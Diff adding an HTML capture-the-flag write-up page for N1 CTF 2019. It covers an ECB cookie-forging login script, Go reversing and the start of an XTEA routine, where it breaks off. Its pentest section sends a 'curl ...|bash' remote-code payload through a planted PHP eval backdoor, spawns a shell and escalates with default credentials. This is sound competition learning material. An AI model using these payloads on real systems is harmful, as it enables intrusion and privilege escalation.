@@ -1,0 +1,1234 @@
+<!DOCTYPE HTML>
+<!-- This page is modified from the template https://www.codeply.com/go/7XYosZ7VH5 by Carol Skelly (@iatek). -->
+<html>
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <title>N1 CTF 2019</title>
+    <link type="text/css" rel="stylesheet" href="../assets/css/github-markdown.css">
+    <link type="text/css" rel="stylesheet" href="../assets/css/pilcrow.css">
+    <link type="text/css" rel="stylesheet" href="../assets/css/hljs-github.min.css"/>
+    <link type="text/css" rel="stylesheet" href="../assets/css/bootstrap-4.0.0-beta.3.min.css">
+    <script type="text/javascript" src="../assets/js/jquery-3.3.1.slim.min.js"></script>
+    <script type="text/javascript" src="../assets/js/bootstrap-4.0.0-beta.3.min.js"></script>
+    <script type="text/javascript" src="../assets/js/popper-1.14.3.min.js"></script>
+    <script type="text/javascript" src="../assets/js/mathjax-2.7.4/MathJax.js?config=TeX-MML-AM_CHTML"></script>
+  </head>
+  <style>
+  body {
+      padding-top: 56px;
+  }
+
+  .sticky-offset {
+      top: 56px;
+  }
+
+  #body-row {
+      margin-left:0;
+      margin-right:0;
+  }
+  #sidebar-container {
+      min-height: 100vh;   
+      background-color: #333;
+      padding: 0;
+  }
+
+  /* Sidebar sizes when expanded and expanded */
+  .sidebar-expanded {
+      width: 230px;
+  }
+  .sidebar-collapsed {
+      width: 60px;
+  }
+
+  /* Menu item*/
+  #sidebar-container .list-group a {
+      height: 50px;
+      color: white;
+  }
+
+  /* Submenu item*/
+  #sidebar-container .list-group .sidebar-submenu a {
+      height: 45px;
+      padding-left: 60px;
+  }
+  .sidebar-submenu {
+      font-size: 0.9rem;
+  }
+
+  /* Separators */
+  .sidebar-separator-title {
+      background-color: #333;
+      height: 35px;
+  }
+  .sidebar-separator {
+      background-color: #333;
+      height: 25px;
+  }
+  .logo-separator {
+      background-color: #333;    
+      height: 60px;
+  }
+
+
+  /* 
+   active scrollspy
+  */
+  .list-group-item.active {
+    border-color: transparent;
+    border-left: #e69138 solid 4px;
+  }
+
+  /* 
+   anchor padding top
+   https://stackoverflow.com/a/28824157
+  */
+  :target:before {
+    content:"";
+    display:block;
+    height:56px; /* fixed header height*/
+    margin:-56px 0 0; /* negative fixed header height */
+  }
+  </style>
+  
+  <script>
+  // https://stackoverflow.com/a/48330533
+  $(window).on('activate.bs.scrollspy', function (event) {
+    let active_collapse = $($('.list-group-item.active').parents()[0]);
+    $(".collapse").removeClass("show");
+    active_collapse.addClass("show");
+
+    let parent_menu = $('a[href="#' + active_collapse[0].id + '"]');
+    $('a[href^="#submenu"]').css("border-left", "");
+    parent_menu.css("border-left","#e69138 solid 4px");
+  });
+
+  // http://docs.mathjax.org/en/latest/tex.html#tex-and-latex-math-delimiters
+  MathJax.Hub.Config({
+    tex2jax: {
+      inlineMath: [['$','$'], ['\\(','\\)']],
+      processEscapes: true
+    }
+  });
+  </script>
+
+  <body style="position: relative;" data-spy="scroll" data-target=".sidebar-submenu" data-offset="70">
+    <nav class="navbar navbar-expand-md navbar-light bg-light fixed-top">
+      <button class="navbar-toggler navbar-toggler-right" type="button" data-toggle="collapse" data-target="#navbarNavDropdown" aria-controls="navbarNavDropdown" aria-expanded="false" aria-label="Toggle navigation">
+        <span class="navbar-toggler-icon"></span>
+      </button>
+      <a class="navbar-brand" href="https://github.com/balsn/ctf_writeup">
+        <img src="https://github.githubassets.com/images/modules/logos_page/GitHub-Mark.png" class="d-inline-block align-top" alt="" width="30" height="30">
+        <span class="menu-collapsed">balsn / ctf_writeup</span>
+      </a>
+      <div class="collapse navbar-collapse" id="navbarNavDropdown">
+        <ul class="navbar-nav my-2 my-lg-0">
+            
+            <li class="nav-item dropdown d-sm-block d-md-none">
+              <iframe src="https://ghbtns.com/github-btn.html?user=balsn&repo=ctf_writeup&type=watch&count=true&size=large&v=2" frameborder="0" scrolling="0" width="140px" height="30px"></iframe>
+              <iframe src="https://ghbtns.com/github-btn.html?user=balsn&repo=ctf_writeup&type=star&count=true&size=large" frameborder="0" scrolling="0" width="140px" height="30px"></iframe>
+        
+              <a class="nav-link dropdown-toggle" href="#" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+                web
+              </a>
+              <div class="dropdown-menu" aria-labelledby="smallerscreenmenu">
+                                <a class="dropdown-item" href="#old-attack(step1)">old-attack(step1)</a>
+    
+                <a class="dropdown-item" href="#pentest-n1ctf2019.lab(step1)">pentest-n1ctf2019.lab(step1)</a>
+    
+              </div>
+            </li>
+    
+            <li class="nav-item dropdown d-sm-block d-md-none">
+              <a class="nav-link dropdown-toggle" href="#" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+                reverse
+              </a>
+              <div class="dropdown-menu" aria-labelledby="smallerscreenmenu">
+                                <a class="dropdown-item" href="#lost-in-the-deep">lost-in-the-deep</a>
+    
+                <a class="dropdown-item" href="#ropvm">ropvm</a>
+    
+              </div>
+            </li>
+    
+            <li class="nav-item dropdown d-sm-block d-md-none">
+              <a class="nav-link dropdown-toggle" href="#" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+                misc
+              </a>
+              <div class="dropdown-menu" aria-labelledby="smallerscreenmenu">
+                                <a class="dropdown-item" href="#checkin">checkin</a>
+    
+                <a class="dropdown-item" href="#n1egg---a-waf,-a-world">n1egg---a-waf,-a-world</a>
+    
+              </div>
+            </li>
+    
+            <li class="nav-item dropdown d-sm-block d-md-none">
+              <a class="nav-link dropdown-toggle" href="#" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+                crypto
+              </a>
+              <div class="dropdown-menu" aria-labelledby="smallerscreenmenu">
+                                <a class="dropdown-item" href="#baby-rsa">baby-rsa</a>
+    
+                <a class="dropdown-item" href="#guess_ex">guess_ex</a>
+    
+              </div>
+            </li>
+    
+            <li class="nav-item dropdown d-sm-block d-md-none">
+              <a class="nav-link dropdown-toggle" href="#" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+                pwn
+              </a>
+              <div class="dropdown-menu" aria-labelledby="smallerscreenmenu">
+                                <a class="dropdown-item" href="#warmup">warmup</a>
+    
+                <a class="dropdown-item" href="#line">line</a>
+    
+                <a class="dropdown-item" href="#babypwn">babypwn</a>
+    
+                <a class="dropdown-item" href="#babykernel">babykernel</a>
+    
+              </div>
+            </li>
+    
+        </ul>
+      </div>
+      <div class="navbar-collapse collapse w-100 order-3 dual-collapse2">
+        <ul class="navbar-nav ml-auto">
+          <iframe src="https://ghbtns.com/github-btn.html?user=balsn&repo=ctf_writeup&type=watch&count=true&size=large&v=2" frameborder="0" scrolling="0" width="160px" height="30px"></iframe>
+          <iframe src="https://ghbtns.com/github-btn.html?user=balsn&repo=ctf_writeup&type=star&count=true&size=large" frameborder="0" scrolling="0" width="160px" height="30px"></iframe>
+        </ul>
+      </div>
+    </nav>
+    <div class="row" id="body-row">
+      <div id="sidebar-container" class="sidebar-expanded d-none d-md-block col-2">
+        <ul class="list-group sticky-top sticky-offset">
+          
+          <a href="#submenu0" data-toggle="collapse" aria-expanded="false" class="list-group-item list-group-item-action flex-column align-items-start bg-dark">
+            <div class="d-flex w-100 justify-content-start align-items-center font-weight-bold">
+              <span class="fa fa-dashboard fa-fw mr-3"></span>
+              <span class="menu-collapsed">web</span>
+              <span class="submenu-icon ml-auto"></span>
+            </div>
+          </a>
+          <div id="submenu0" class="collapse sidebar-submenu">
+            <a href="#old-attack(step1)" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">old-attack(step1)</span>
+            </a>
+    
+<a href="#pentest-n1ctf2019.lab(step1)" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">pentest-n1ctf2019.lab(step1)</span>
+            </a>
+    
+          </div>
+    
+          <a href="#submenu1" data-toggle="collapse" aria-expanded="false" class="list-group-item list-group-item-action flex-column align-items-start bg-dark">
+            <div class="d-flex w-100 justify-content-start align-items-center font-weight-bold">
+              <span class="fa fa-dashboard fa-fw mr-3"></span>
+              <span class="menu-collapsed">reverse</span>
+              <span class="submenu-icon ml-auto"></span>
+            </div>
+          </a>
+          <div id="submenu1" class="collapse sidebar-submenu">
+            <a href="#lost-in-the-deep" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">lost-in-the-deep</span>
+            </a>
+    
+<a href="#ropvm" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">ropvm</span>
+            </a>
+    
+          </div>
+    
+          <a href="#submenu2" data-toggle="collapse" aria-expanded="false" class="list-group-item list-group-item-action flex-column align-items-start bg-dark">
+            <div class="d-flex w-100 justify-content-start align-items-center font-weight-bold">
+              <span class="fa fa-dashboard fa-fw mr-3"></span>
+              <span class="menu-collapsed">misc</span>
+              <span class="submenu-icon ml-auto"></span>
+            </div>
+          </a>
+          <div id="submenu2" class="collapse sidebar-submenu">
+            <a href="#checkin" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">checkin</span>
+            </a>
+    
+<a href="#n1egg---a-waf,-a-world" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">n1egg---a-waf,-a-world</span>
+            </a>
+    
+          </div>
+    
+          <a href="#submenu3" data-toggle="collapse" aria-expanded="false" class="list-group-item list-group-item-action flex-column align-items-start bg-dark">
+            <div class="d-flex w-100 justify-content-start align-items-center font-weight-bold">
+              <span class="fa fa-dashboard fa-fw mr-3"></span>
+              <span class="menu-collapsed">crypto</span>
+              <span class="submenu-icon ml-auto"></span>
+            </div>
+          </a>
+          <div id="submenu3" class="collapse sidebar-submenu">
+            <a href="#baby-rsa" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">baby-rsa</span>
+            </a>
+    
+<a href="#guess_ex" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">guess_ex</span>
+            </a>
+    
+          </div>
+    
+          <a href="#submenu4" data-toggle="collapse" aria-expanded="false" class="list-group-item list-group-item-action flex-column align-items-start bg-dark">
+            <div class="d-flex w-100 justify-content-start align-items-center font-weight-bold">
+              <span class="fa fa-dashboard fa-fw mr-3"></span>
+              <span class="menu-collapsed">pwn</span>
+              <span class="submenu-icon ml-auto"></span>
+            </div>
+          </a>
+          <div id="submenu4" class="collapse sidebar-submenu">
+            <a href="#warmup" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">warmup</span>
+            </a>
+    
+<a href="#line" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">line</span>
+            </a>
+    
+<a href="#babypwn" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">babypwn</span>
+            </a>
+    
+<a href="#babykernel" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">babykernel</span>
+            </a>
+    
+          </div>
+    
+        </ul>
+      </div>
+      <div class="col-10 py-3">
+        <article class="markdown-body"><h1 id="n1-ctf-2019"><a class="header-link" href="#n1-ctf-2019"></a>N1 CTF 2019</h1>
+
+<h2 id="web"><a class="header-link" href="#web"></a>Web</h2>
+<h3 id="old-attack(step1)"><a class="header-link" href="#old-attack(step1)"></a>Old Attack(step1)</h3>
+<p>This is actually a warm-up crypto challenge.</p>
+<p>After registering an account, we will be set a cookie <code>auth_name</code> which is base64 encoded.</p>
+<p>The <code>auth_name</code> will have the following formats:</p>
+<pre class="hljs"><code><span class="hljs-number">24</span>*<span class="hljs-selector-tag">p</span>:   fb4d379d7d90aa4b963fbf32336bca9d c521178ec906464f23f197b0025ad6fd
+<span class="hljs-number">16</span>*<span class="hljs-selector-tag">p</span>:   fb4d379d7d90aa4b963fbf32336bca9d f50d78b0e3f3833799f7f07d0b97f707
+<span class="hljs-number">16</span>*k:   <span class="hljs-number">8309</span>f00ce73438ee8afac0832a3d731a f50d78b0e3f3833799f7f07d0b97f707</code></pre><p>Therefore, it&#39;s like a symmetric cipher in ECB mode. We can also infer that each ciphertext block has 16 bytes. This block <code>f50d78b0e3f3833799f7f07d0b97f707</code> is a 0-byte padding.</p>
+<p>Our objective is to login as admin. Thus we create a user named <code>p * 16 + admin</code>, and just truncate the first block. The plaintext of the second block will be <code>admin</code>.</p>
+<pre class="hljs"><code><span class="hljs-comment">#!/usr/bin/env python3</span>
+<span class="hljs-keyword">import</span> requests
+<span class="hljs-keyword">import</span> re
+<span class="hljs-keyword">import</span> secrets
+<span class="hljs-keyword">from</span> urllib.parse <span class="hljs-keyword">import</span> unquote
+<span class="hljs-keyword">from</span> base64 <span class="hljs-keyword">import</span> b64decode
+
+s = requests.session()
+s.get(<span class="hljs-string">'http://150.109.197.222/'</span>)
+r = s.get(<span class="hljs-string">'http://150.109.197.222/register'</span>)
+token = re.findall(<span class="hljs-string">'input type="hidden" name="_token" value="(.*)"&gt;'</span>, r.text)[<span class="hljs-number">0</span>]
+
+name = <span class="hljs-string">'p'</span> * <span class="hljs-number">16</span> + <span class="hljs-string">'admin'</span>
+
+data = {
+     <span class="hljs-string">'_token'</span>: token,
+     <span class="hljs-string">'name'</span>: name,
+     <span class="hljs-string">'email'</span>: secrets.token_urlsafe(<span class="hljs-number">32</span>) + <span class="hljs-string">'@example.com'</span>,
+     <span class="hljs-string">'password'</span>: <span class="hljs-string">'ap0zcj2nfao'</span>,
+     <span class="hljs-string">'password_confirmation'</span>: <span class="hljs-string">'ap0zcj2nfao'</span>
+}
+print(<span class="hljs-string">'posting'</span>)
+r = s.post(<span class="hljs-string">'http://150.109.197.222/register'</span>, data=data)
+<span class="hljs-keyword">assert</span> <span class="hljs-string">'./userpage/'</span> <span class="hljs-keyword">in</span> r.text
+auth = b64decode(unquote(r.cookies.get(<span class="hljs-string">'auth_name'</span>)))
+print(auth.hex())
+print(len(auth))</code></pre><p>The flag is <code>N1CTF{Cbc_is_easy_Notsaf3_s0_Old}</code>.</p>
+<h3 id="pentest-n1ctf2019.lab(step1)"><a class="header-link" href="#pentest-n1ctf2019.lab(step1)"></a>Pentest N1ctf2019.lab(step1)</h3>
+<p>This is a penetration testing challenge. We also need privilege escalation to read <code>/root/flag</code>.</p>
+<p>Let us use nmap to perform a port scan first. The server has FTP(21),SSH(22),HTTP(80) opened. The most suspicous is FTP. We quickly login as <code>anonymous</code> and run <code>ls</code> to list files. The FTP root directory is the same as the web root.</p>
+<p>There is a backdoor file named <code>mmmmm.php</code>. The parameter <code>enjoy~</code> will be evaluated. It&#39;s trivial to get RCE:</p>
+<pre class="hljs"><code>Welcome to N1ctf2019.lab!
+
+<span class="hljs-meta">&lt;?</span>=<span class="hljs-keyword">eval</span>($_REQUEST[<span class="hljs-string">"enjoy~"</span>]);<span class="hljs-meta">?&gt;</span></code></pre><pre class="hljs"><code><span class="hljs-keyword">import</span> requests
+r= requests.get(<span class="hljs-string">'http://47.52.129.242/mmmmm.php'</span>,params={<span class="hljs-string">'enjoy~'</span>: <span class="hljs-string">"system('curl 240.240.240.240:1234|bash');"</span>})</code></pre><p>We&#39;ll probably interact with tty, so run this first: </p>
+<pre class="hljs"><code># http<span class="hljs-variable">s:</span>//evertpot.<span class="hljs-keyword">com</span>/<span class="hljs-number">189</span>/
+<span class="hljs-keyword">python3</span> -<span class="hljs-keyword">c</span> <span class="hljs-string">"import pty; pty.spawn('/bin/bash')"</span></code></pre><p>Next, gathering the system info from <code>/etc/os-release</code> and <code>uname --all</code>. This is a pretty outdated Ubuntu:</p>
+<pre class="hljs"><code>Linux web.n1ctf2019.lab 4.4.0-93-generic #116~14.04.1-Ubuntu SMP Mon Aug 14 16:07:05 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux
+
+
+NAME=<span class="hljs-string">"Ubuntu"</span>
+VERSION=<span class="hljs-string">"14.04.5 LTS, Trusty Tahr"</span>
+ID=ubuntu
+ID_LIKE=debian
+PRETTY_NAME=<span class="hljs-string">"Ubuntu 14.04.5 LTS"</span>
+VERSION_ID=<span class="hljs-string">"14.04"</span>
+HOME_URL=<span class="hljs-string">"http://www.ubuntu.com/"</span>
+SUPPORT_URL=<span class="hljs-string">"http://help.ubuntu.com/"</span>
+BUG_REPORT_URL=<span class="hljs-string">"http://bugs.launchpad.net/ubuntu/"</span></code></pre><p>One of the hint is <code>Hint for Pentest N1ctf2019.lab step1(Web):https://wiki.archlinux.org/index.php/Snap</code>. Thus we quickly found this privilege escalation exploit <a href="https://github.com/initstring/dirty_sock">dirty_sock(CVE-2019-7304)</a>. However, the <code>snapd</code> on the server is <code>snapd 2.40</code> which is not vulnerable. We&#39;ve also tried other privilege escalation exploits but they didn&#39;t work.</p>
+<p>Then, after reading <code>/etc/passwd</code> we found there is a user name <code>dirty_sock</code>. Both <code>su dirty_sock</code> or <code>ssh dirty_sock@server</code>  with password <code>dirty_sock</code> leads to successful login. Than we found this user is in sudoers. With the password we can easily get root via <code>sudo su</code>. </p>
+<p><code>sudo cat /root/flag.txt</code>: <code>N1CTF{ImpOrtant_P0int3_4de0e}</code></p>
+<h2 id="reverse"><a class="header-link" href="#reverse"></a>Reverse</h2>
+<h3 id="lost-in-the-deep"><a class="header-link" href="#lost-in-the-deep"></a>lost in the deep</h3>
+<p>It should be easy to find out that this challenge is golange reverse challenge.</p>
+<p>We are given a PE32+ binary and it&#39;s stripped. Our first priority is relabeling the function in the binary.</p>
+<p>I try to use <a href="https://github.com/spigwitmer/golang_loader_assist/blob/master/golang_loader_assist.py">golang_loader_assist.py</a>. But somehow it didn&#39;t work.</p>
+<p>The reason is that there is no segment called <code>.gopclntab</code>.  So we should fix this.</p>
+<pre class="hljs"><code><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_gopclntab_seg</span><span class="hljs-params">()</span>:</span>
+    <span class="hljs-comment">#   .gopclntab found in PE &amp; ELF binaries, __gopclntab found in macho binaries</span>
+    <span class="hljs-keyword">return</span> _get_seg([<span class="hljs-string">'.gopclntab'</span>, <span class="hljs-string">'__gopclntab'</span>])</code></pre><p>Once we relabeled the functions, we can find two suspicious functions: <code>main_check</code> and <code>main_dec</code></p>
+<p><code>main_dec</code> decodes your input. It&#39;s a base64 decoder with a customized table <code>y17nEl9DBfHIvb42qs+xG5NKcO/6moMzYtSeApg8LZFC3TkUu0JihWRrwdQaXVPj</code></p>
+<p><code>main_check</code> is like a variation of knapsack problem. you need maxmize the value while the weight limit is <code>0xe9</code>. But at the being we can only take [0]. After [0] is taken. it unlock [1], [2], [3], [4]. So the rule is that we need to unlock the options before we take them.</p>
+<pre class="hljs"><code>        value, weight, unlock options
+ <span class="hljs-comment">[0]</span>  , 0x52 , 0x6 : <span class="hljs-comment">[1]</span>  <span class="hljs-comment">[2]</span>  <span class="hljs-comment">[3]</span>  <span class="hljs-comment">[4]</span> 
+ <span class="hljs-comment">[1]</span>  , 0x2e , 0x1f: <span class="hljs-comment">[5]</span>  <span class="hljs-comment">[6]</span>  <span class="hljs-comment">[7]</span> 
+ <span class="hljs-comment">[2]</span>  , 0x35 , 0x28:
+ <span class="hljs-comment">[3]</span>  , 0xf  , 0xa : <span class="hljs-comment">[8]</span>  <span class="hljs-comment">[9]</span>  <span class="hljs-comment">[a]</span>  <span class="hljs-comment">[b]</span>  <span class="hljs-comment">[c]</span> 
+ <span class="hljs-comment">[4]</span>  , 0x2  , 0x12: <span class="hljs-comment">[d]</span>  <span class="hljs-comment">[e]</span> 
+ <span class="hljs-comment">[5]</span>  , 0x33 , 0x16: <span class="hljs-comment">[f]</span>  <span class="hljs-comment">[g]</span> 
+ <span class="hljs-comment">[6]</span>  , 0x36 , 0x16:
+ <span class="hljs-comment">[7]</span>  , 0xe  , 0x10: <span class="hljs-comment">[h]</span>  <span class="hljs-comment">[i]</span>  <span class="hljs-comment">[j]</span>  <span class="hljs-comment">[k]</span> 
+ <span class="hljs-comment">[8]</span>  , 0x1  , 0x24: <span class="hljs-comment">[l]</span>  <span class="hljs-comment">[m]</span>  <span class="hljs-comment">[n]</span> 
+ <span class="hljs-comment">[9]</span>  , 0x2b , 0x11:
+ <span class="hljs-comment">[a]</span>  , 0x56 , 0x6 : <span class="hljs-comment">[o]</span>  <span class="hljs-comment">[p]</span>  <span class="hljs-comment">[q]</span> 
+ <span class="hljs-comment">[b]</span>  , 0x2e , 0x8 : <span class="hljs-comment">[r]</span>  <span class="hljs-comment">[s]</span>  <span class="hljs-comment">[t]</span> 
+ <span class="hljs-comment">[c]</span>  , 0x2f , 0x22:
+ <span class="hljs-comment">[d]</span>  , 0x63 , 0x11:
+ <span class="hljs-comment">[e]</span>  , 0x4b , 0x32:
+ <span class="hljs-comment">[f]</span>  , 0x36 , 0x29: <span class="hljs-comment">[u]</span> 
+ <span class="hljs-comment">[g]</span>  , 0x6  , 0x2 : <span class="hljs-comment">[v]</span>  <span class="hljs-comment">[w]</span>  <span class="hljs-comment">[x]</span>  <span class="hljs-comment">[y]</span>  <span class="hljs-comment">[z]</span> 
+ <span class="hljs-comment">[h]</span>  , 0x1e , 0x22: <span class="hljs-comment">[A]</span> 
+ <span class="hljs-comment">[i]</span>  , 0x38 , 0x21: <span class="hljs-comment">[B]</span> 
+ <span class="hljs-comment">[j]</span>  , 0x4f , 0xb :
+ <span class="hljs-comment">[k]</span>  , 0x2c , 0x17: <span class="hljs-comment">[C]</span> 
+ <span class="hljs-comment">[l]</span>  , 0x1a , 0x2b: <span class="hljs-comment">[D]</span>  <span class="hljs-comment">[E]</span>  <span class="hljs-comment">[F]</span> 
+ <span class="hljs-comment">[m]</span>  , 0x19 , 0x1 : <span class="hljs-comment">[G]</span>  <span class="hljs-comment">[H]</span> 
+ <span class="hljs-comment">[n]</span>  , 0x52 , 0x30: <span class="hljs-comment">[I]</span> 
+ <span class="hljs-comment">[o]</span>  , 0x4  , 0x2 :
+ <span class="hljs-comment">[p]</span>  , 0x10 , 0x3 :
+ <span class="hljs-comment">[q]</span>  , 0x5c , 0xf : <span class="hljs-comment">[J]</span> 
+ <span class="hljs-comment">[r]</span>  , 0x52 , 0x20: <span class="hljs-comment">[K]</span>  <span class="hljs-comment">[L]</span>  <span class="hljs-comment">[M]</span> 
+ <span class="hljs-comment">[s]</span>  , 0x36 , 0x8 : <span class="hljs-comment">[N]</span> 
+ <span class="hljs-comment">[t]</span>  , 0x47 , 0x30:
+ <span class="hljs-comment">[u]</span>  , 0x62 , 0x2c:
+ <span class="hljs-comment">[v]</span>  , 0x47 , 0x2 : <span class="hljs-comment">[O]</span>  <span class="hljs-comment">[P]</span> 
+ <span class="hljs-comment">[w]</span>  , 0x31 , 0x8 : <span class="hljs-comment">[Q]</span>  <span class="hljs-comment">[R]</span>  <span class="hljs-comment">[S]</span>  <span class="hljs-comment">[T]</span> 
+ <span class="hljs-comment">[x]</span>  , 0x13 , 0x1d:
+ <span class="hljs-comment">[y]</span>  , 0xf  , 0x1d:
+ <span class="hljs-comment">[z]</span>  , 0x3d , 0x32: <span class="hljs-comment">[U]</span>  <span class="hljs-comment">[V]</span>  <span class="hljs-comment">[W]</span>  <span class="hljs-comment">[X]</span> 
+ <span class="hljs-comment">[A]</span>  , 0x64 , 0x5 :
+ <span class="hljs-comment">[B]</span>  , 0x41 , 0x16:
+ <span class="hljs-comment">[C]</span>  , 0xd  , 0x14: <span class="hljs-comment">[Y]</span>  <span class="hljs-comment">[Z]</span> 
+ <span class="hljs-comment">[D]</span>  , 0xe  , 0x1b: <span class="hljs-comment">[!]</span> 
+ <span class="hljs-comment">[E]</span>  , 0x48 , 0x1c: <span class="hljs-comment">["]</span> 
+ <span class="hljs-comment">[F]</span>  , 0x2e , 0x2d: <span class="hljs-comment">[#]</span> 
+ <span class="hljs-comment">[G]</span>  , 0x47 , 0xd :
+ <span class="hljs-comment">[H]</span>  , 0x3b , 0x27: <span class="hljs-comment">[$]</span> 
+ <span class="hljs-comment">[I]</span>  , 0x54 , 0x11: <span class="hljs-comment">[%]</span> 
+ <span class="hljs-comment">[J]</span>  , 0x1a , 0x4 : <span class="hljs-comment">[&amp;]</span> 
+ <span class="hljs-comment">[K]</span>  , 0xb  , 0x22:
+ <span class="hljs-comment">[L]</span>  , 0x13 , 0x11: <span class="hljs-comment">[']</span> 
+ <span class="hljs-comment">[M]</span>  , 0x4a , 0x28: <span class="hljs-comment">[(]</span> 
+ <span class="hljs-comment">[N]</span>  , 0x24 , 0xb :
+ <span class="hljs-comment">[O]</span>  , 0x4f , 0x20:
+ <span class="hljs-comment">[P]</span>  , 0x2d , 0x32: <span class="hljs-comment">[)]</span> 
+ <span class="hljs-comment">[Q]</span>  , 0x51 , 0x15:
+ <span class="hljs-comment">[R]</span>  , 0x7  , 0x11: <span class="hljs-comment">[*]</span> 
+ <span class="hljs-comment">[S]</span>  , 0x36 , 0x1c:
+ <span class="hljs-comment">[T]</span>  , 0x3b , 0x1c: <span class="hljs-comment">[+]</span>  <span class="hljs-comment">[,]</span> 
+ <span class="hljs-comment">[U]</span>  , 0x63 , 0x6 : <span class="hljs-comment">[-]</span>  <span class="hljs-comment">[.]</span>  <span class="hljs-comment">[/]</span> 
+ <span class="hljs-comment">[V]</span>  , 0x4  , 0x1a:
+ <span class="hljs-comment">[W]</span>  , 0x10 , 0x19: <span class="hljs-comment">[:]</span>  <span class="hljs-comment">[;]</span> 
+ <span class="hljs-comment">[X]</span>  , 0x23 , 0x3 :
+ <span class="hljs-comment">[Y]</span>  , 0x28 , 0x24: <span class="hljs-comment">[&lt;]</span> 
+ <span class="hljs-comment">[Z]</span>  , 0x23 , 0x13:
+ <span class="hljs-comment">[!]</span>  , 0x13 , 0xd :
+ <span class="hljs-comment">["]</span>  , 0x55 , 0x22: <span class="hljs-comment">[=]</span> 
+ <span class="hljs-comment">[#]</span>  , 0x12 , 0x4 :
+ <span class="hljs-comment">[$]</span>  , 0x1f , 0x2b:
+ <span class="hljs-comment">[%]</span>  , 0x8  , 0x2b: <span class="hljs-comment">[&gt;]</span> 
+ <span class="hljs-comment">[&amp;]</span>  , 0x1d , 0x16:
+ <span class="hljs-comment">[']</span>  , 0x14 , 0x15:
+ <span class="hljs-comment">[(]</span>  , 0xc  , 0x7 : <span class="hljs-comment">[?]</span>  <span class="hljs-comment">[@]</span> 
+ <span class="hljs-comment">[)]</span>  , 0x49 , 0x29: <span class="hljs-comment">[<span class="hljs-comment">[]</span> 
+ <span class="hljs-comment">[*]</span>  , 0x9  , 0x22: <span class="hljs-comment">[\]</span> 
+ <span class="hljs-comment">[+]</span>  , 0x64 , 0x24:
+ <span class="hljs-comment">[,]</span>  , 0x56 , 0x27: <span class="hljs-comment">[]</span>]</span> 
+ <span class="hljs-comment">[-]</span>  , 0x18 , 0x29: <span class="hljs-comment">[^]</span> 
+ <span class="hljs-comment">[.]</span>  , 0x18 , 0x1b: <span class="hljs-comment">[_]</span>  <span class="hljs-comment">[`]</span>  <span class="hljs-comment">[{]</span> 
+ <span class="hljs-comment">[/]</span>  , 0x13 , 0x10: <span class="hljs-comment">[|]</span> 
+ <span class="hljs-comment">[:]</span>  , 0x54 , 0x1c: <span class="hljs-comment">[}]</span> 
+ <span class="hljs-comment">[;]</span>  , 0xa  , 0x14:
+ <span class="hljs-comment">[&lt;]</span>  , 0x63 , 0x25:
+ <span class="hljs-comment">[=]</span>  , 0x61 , 0x8 :
+ <span class="hljs-comment">[&gt;]</span>  , 0x31 , 0x25: <span class="hljs-comment">[~]</span> 
+ <span class="hljs-comment">[?]</span>  , 0x16 , 0xa :
+ <span class="hljs-comment">[@]</span>  , 0x5d , 0x2e:
+ <span class="hljs-comment">[<span class="hljs-comment">[]</span>  , 0x63 , 0x5 :
+ <span class="hljs-comment">[\]</span>  , 0x2d , 0x2c:
+ <span class="hljs-comment">[]</span>]</span>  , 0x56 , 0x3 :
+ <span class="hljs-comment">[^]</span>  , 0x40 , 0x18:
+ <span class="hljs-comment">[_]</span>  , 0x5b , 0xb :
+ <span class="hljs-comment">[`]</span>  , 0x56 , 0xc : <span class="hljs-comment">[ ]</span> 
+ <span class="hljs-comment">[{]</span>  , 0x42 , 0x19: <span class="hljs-comment">[    ]</span> 
+ <span class="hljs-comment">[|]</span>  , 0x3b , 0xf : <span class="hljs-comment">[
+]</span>  <span class="hljs-comment">[]</span> 
+ <span class="hljs-comment">[}]</span>  , 0x13 , 0x2a:
+ <span class="hljs-comment">[~]</span>  , 0xb  , 0x87: <span class="hljs-comment">[\x0b]</span>  <span class="hljs-comment">[\x0c]</span> 
+ <span class="hljs-comment">[ ]</span>  , 0x46 , 0x21:
+ <span class="hljs-comment">[    ]</span>  , 0x3a , 0x22:
+ <span class="hljs-comment">[
+]</span>  , 0x25 , 0xe :
+ <span class="hljs-comment">[]</span>  , 0x52 , 0x1 :
+ <span class="hljs-comment">[\x0b]</span>  , 0x18e , 0x44:
+ <span class="hljs-comment">[\x0c]</span>  , 0x1e0 , 0x37:
+</code></pre><p>For the first flag, the value should be <code>0x219</code>. And the seccond flag needs value reach <code>0x41a</code> </p>
+<p>I didn&#39;t figure out a good algorithm for this variation of knapsack problem. I manually find out the sequence that can reach <code>0x41a</code> is  <code>0135abgpqsvwzQUX/|\x0d</code></p>
+<p>And the flags for this challenge are <code>N1CTF{r3V3r53_G0_3X3_w17h0u7_5YmB01}</code> and <code>N1CTF{C41cu1473_17_0r_Ju57_R4c3_17}</code></p>
+<h3 id="ropvm"><a class="header-link" href="#ropvm"></a>ROPVM</h3>
+<p>Reverse and find it is XTEA</p>
+<pre class="hljs"><code>#include &lt;stdint.h&gt;
+void decipher(unsigned int num_rounds, uint32_t v[<span class="hljs-number">2</span>], uint32_t const <span class="hljs-type">key</span>[<span class="hljs-number">4</span>]) {
+    unsigned int i;
